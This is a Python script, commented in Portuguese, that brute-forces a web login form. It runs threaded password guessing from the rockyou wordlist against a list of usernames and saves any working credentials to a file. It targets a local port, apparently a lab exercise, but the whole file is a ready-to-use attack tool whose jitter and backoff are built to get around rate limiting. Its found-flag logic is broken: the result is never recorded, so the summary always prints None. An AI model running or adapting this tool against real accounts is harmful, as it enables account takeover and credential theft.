import requests
import threading
import time
import random

# Configurações
throttle_ms = 200        # atraso base em milissegundos entre requisições de cada thread
jitter_ms = 20          # jitter aleatório adicional (0..jitter_ms)
max_threads = 50        # limite global de threads simultâneas (se quiser limitar)
request_timeout = 8     # timeout do requests (segundos)
max_retries_on_429 = 5  # tentativas de backoff exponencial em 429/503/erros de conexão

# Variáveis de controle
threads = []
found_event = threading.Event()
found_result = {"senha": None}
file_lock = threading.Lock()

# contador de exemplo (usando lock pra evitar race)
contador = 0
contador_lock = threading.Lock()

def incrementar():
    global contador
    with contador_lock:
        contador += 1
        print(contador)

# Semáforo para limitar threads (opcional)
sem = threading.Semaphore(max_threads)

def request(nome, senhas):
    # cada thread pega o semáforo ao iniciar
    with sem:
        sess = requests.session()
        # se você quiser enviar um cookie default:
        sess.cookies.update({"verify": "carlos"})
        URL = "http://127.0.0.1:1337/login"

        for senha in senhas:
            # se outra thread já encontrou, saia
            if found_event.is_set():
                return

            # throttle + jitter antes de cada tentativa
            sleep_ms = throttle_ms + random.randint(0, jitter_ms)
            time.sleep(sleep_ms / 1000.0)

            # tenta a requisição com backoff em caso de 429/503/erros de rede
            backoff = 1.0
            attempts = 0
            while attempts <= max_retries_on_429:
                try:
                    r = sess.post(URL, data={"username": nome, "password": senha},
                                  timeout=request_timeout, allow_redirects=False)
                except requests.exceptions.RequestException as e:
                    # falha de rede; faz backoff exponencial e tenta de novo
                    attempts += 1
                    if attempts > max_retries_on_429:
                        print(f"[t{threading.current_thread().name}] erro rede com {nome}:{senha} -> {e}")
                        r = None
                        break
                    time.sleep(backoff)
                    backoff *= 2
                    continue

                # se obteve resposta HTTP
                if r is not None and r.status_code in (429, 503):
                    attempts += 1
                    if attempts > max_retries_on_429:
                        print(f"[t{threading.current_thread().name}] many {r.status_code} for {nome}:{senha}, skipping")
                        break
                    # backoff exponencial com jitter
                    delay = backoff + random.random() * 0.5
                    print(f"[t{threading.current_thread().name}] {r.status_code} recebido — backoff {delay:.2f}s")
                    time.sleep(delay)
                    backoff *= 2
                    continue

                # tudo OK (ou outro status)
                break

            # se não teve resposta válida continue para próxima senha
            if r is None:
                continue

            # aqui você decide o critério de sucesso; no seu código original
            # usava "Invalid credentials" dentro do body para detectar falha:
            if 'Invalid credentials' not in r.text and r.status_code not in (401, 403):
                # achou
                print(f"[t{threading.current_thread().name}] SUCESSO {nome}:{senha} -> status {r.status_code}")
                with file_lock:
                    with open('login_senha.txt', 'a', encoding='utf-8') as arquivo:
                        arquivo.write(f"Usuario: {nome}\nSenha: {senha}\nStatus Code: {r.status_code}\nTempo: {time.time()}\n\n")
            else:
                # opcional: print debug das tentativas (descomente se quiser)
                # print(f"[t{threading.current_thread().name}] try {nome}:{senha} -> status {r.status_code}")
                pass

# Carrega nicks e senhas
with open('nicks.txt', 'r', encoding='utf-8') as arquivo:
    nomes = [linha.strip() for linha in arquivo if linha.strip()]

with open('rockyou.txt', 'r', encoding='utf-8', errors='ignore') as arquivo:
    password = [linha.strip() for linha in arquivo if linha.strip()]

# cria threads (uma por usuario). Se houver muitos nomes, considere usar um pool
for nome in nomes:
    t = threading.Thread(target=request, args=(nome, password), name=str(nome))
    t.daemon = True
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("Fim. Resultado:", found_result)
